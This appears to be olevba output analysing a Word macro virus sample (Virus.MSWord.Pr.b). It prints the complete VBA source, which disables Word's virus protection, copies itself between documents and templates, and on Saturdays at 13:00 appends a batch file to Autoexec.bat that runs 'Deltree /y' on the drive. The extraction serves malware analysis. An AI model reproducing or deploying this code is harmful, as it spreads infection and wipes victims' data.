olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pr.b-61536f203a606f5dd1e9a35497dcdbe6ec5cba9a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pr.b-61536f203a606f5dd1e9a35497dcdbe6ec5cba9a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

















'







Dim A, B, D, E As Integer: Dim t, m, f, sf, w, s, sd
Private Sub Document_Close()
On Error GoTo rr
Options.VirusProtection = False: s = Application.ActiveDocument.Path: If s = "" Then End
A = 1: B = 2: pr1: A = 2: B = 1: pr1: t = Now: m = Year(t): w = WeekDay(t)
If m < 2002 Or w <> 7 Then End
If Hour(t) <> 13 Then End
pr2
rr:
End
End Sub
Private Sub pr1()
On Error GoTo rr1
D = Application.VBE.VBProjects(A).VBComponents(1).CodeModule.CountOfLines: E = Application.VBE.VBProjects(B).VBComponents(1).CodeModule.CountOfLines
If D > 10 Then Exit Sub
Application.VBE.VBProjects(A).VBComponents(1).CodeModule.AddFromString (Application.VBE.VBProjects(B).VBComponents(1).CodeModule.Lines(2, E))
Application.ActiveDocument.SaveAs
rr1:
End
End Sub
Private Sub pr2()
On Error GoTo rr2
fs = "c:\Autoexec.bat": f = "c:\My.bat": sd = Left(s, 2)
Open fs For Input As #1: Do While Not EOF(1): Line Input #1, rs: If rs = f Then Close #1: pr3: End
Loop: Close #1: SetAttr fs, vbNormal
rr2:
Open fs For Append As #1: Print #1, f: Close #1: pr3
End Sub
Private Sub pr3()
On Error GoTo rr3
SetAttr f, vbNormal: Kill f
rr3:
On Error GoTo rr4
Open f For Append As #1: Print #1, "@ Deltree /y "; sd; " >nul": Print #1, "@ del "; f; " >nul": Close
rr4:
End Sub
'microb97




































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |My.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

